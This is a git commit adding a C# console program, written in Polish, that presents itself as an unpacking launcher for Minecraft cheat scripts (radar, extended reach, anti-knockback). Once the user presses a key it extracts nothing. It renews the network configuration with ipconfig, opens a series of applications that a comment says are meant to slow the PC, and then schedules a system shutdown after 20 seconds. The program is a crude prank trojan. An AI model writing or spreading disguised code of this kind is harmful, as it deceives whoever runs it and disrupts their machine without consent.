c68133a44ee3671c438f361bddf80130956ae366
folxik <folxgaming2@gmail.com>
2016-02-23 21:24:52 +0100

    Safe and Sound Kappa

---
+++ MCHCSkrypty/MCHCSkrypty/Program.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics; //lel
+
+namespace MCHCSkrypty // Deticetetett EloBuddy.NET PL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //Zaczynamy
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.Write("Paczka skryptow MCHC i CubeGame & Arivi");
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.DarkMagenta;
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine("Witaj w Launcherze paczki by  el_F_ob_O_ud_L_dy_X");
+            Console.WriteLine("Chcesz wiecej?Odzwiedz moj kanal na Yt!");
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("Opis paczki");
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine("Paczka zawiera skrypty takie jak radar, wiekszy zasieg bicia i antyknock");
+            Console.WriteLine("Mozesz rowniez pobrac wersje AllIN");//Bedzie w nastepnj aktualizacji
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine("Aby rozpoczac wypakowanie kliknij klawisz 'S' na klawiaturze");
+            Console.ReadKey();
+
+            // Dobre skrypty XDDDDDDDDDDDDDDDDDDDDDD
+            
+
+            //Process start SZATDALN hihir
+            
+            
+            
+            Process.Start("ipconfig", "/all");
+            Process.Start("ipconfig", "/flushdns");
+            Process.Start("ipconfig", "/renew");
+            Process.Start("ipconfig", "/renew6");
+            //Troche programikow dla zmulenia pcta
+            System.Diagnostics.Process.Start("cmd.exe");
+            System.Diagnostics.Process.Start("chrome.exe");
+            System.Diagnostics.Process.Start("calc.exe");
+            System.Diagnostics.Process.Start("dxdiag.exe");
+            System.Diagnostics.Process.Start("notepad.exe");
+            //Symboliczny szatdaln iksDE
+            Process.Start("shutdown", "/s /t 20");
+
+
+        }
+    }
+}
